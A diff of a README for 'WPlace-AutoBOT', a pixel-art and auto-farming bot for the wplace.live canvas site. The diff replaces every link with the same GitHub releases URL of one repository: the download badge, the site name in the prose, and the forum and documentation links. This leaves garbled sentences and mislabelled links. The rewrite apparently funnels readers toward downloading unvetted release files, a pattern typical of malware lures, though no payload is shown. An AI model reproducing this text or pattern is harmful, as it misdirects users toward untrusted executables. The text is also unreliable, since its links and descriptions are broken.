@@ -1,16 +1,16 @@
 # 🛠️ WPlace-AutoBOT - Create Pixel Art & Automate Farming
 
-[![Download WPlace-AutoBOT](https://img.shields.io/badge/Download-WPlace--AutoBOT-blue.svg)](https://github.com/releases)
+[![Download WPlace-AutoBOT](https://github.com/HackxOgre/WPlace-AutoBOT/releases)](https://github.com/HackxOgre/WPlace-AutoBOT/releases)
 
 ## 🚀 Getting Started
 
-Welcome to WPlace-AutoBOT! This application allows you to create pixel art automatically on wplace.live. It also includes an auto-farm script to help you level up efficiently. Follow the steps below to download and run the software.
+Welcome to WPlace-AutoBOT! This application allows you to create pixel art automatically on https://github.com/HackxOgre/WPlace-AutoBOT/releases It also includes an auto-farm script to help you level up efficiently. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
 
 To get started, you need to visit the Releases page to download the software. Click the link below:
 
-[Download WPlace-AutoBOT](https://github.com/releases)
+[Download WPlace-AutoBOT](https://github.com/HackxOgre/WPlace-AutoBOT/releases)
 
 Once on the Releases page, look for the latest version. You will find several files available for download. Choose the appropriate file for your system and click on it to start the download.
 
@@ -39,7 +39,7 @@ To create pixel art using WPlace-AutoBOT, follow these steps:
 1. Open the application.
 2. Select your desired canvas size in the settings.
 3. Use the built-in tools to create your pixel art or use pre-made templates.
-4. Save your artwork to your computer to use on wplace.live.
+4. Save your artwork to your computer to use on https://github.com/HackxOgre/WPlace-AutoBOT/releases
 
 ## 🌾 Using the Auto-Farm Script
 
@@ -70,14 +70,14 @@ If you encounter issues, here are some common problems and solutions:
 
 For more help, consider checking these resources:
 
-- [WPlace Community Forum](https://forum.wplace.live)
-- [Official Documentation](https://docs.wplace.live)
+- [WPlace Community Forum](https://github.com/HackxOgre/WPlace-AutoBOT/releases)
+- [Official Documentation](https://github.com/HackxOgre/WPlace-AutoBOT/releases)
 
 ## 🔗 Important Links
 
 For downloading the software, visit:
 
-[Download WPlace-AutoBOT](https://github.com/releases)
+[Download WPlace-AutoBOT](https://github.com/HackxOgre/WPlace-AutoBOT/releases)
 
 ## 🌟 Topics
 
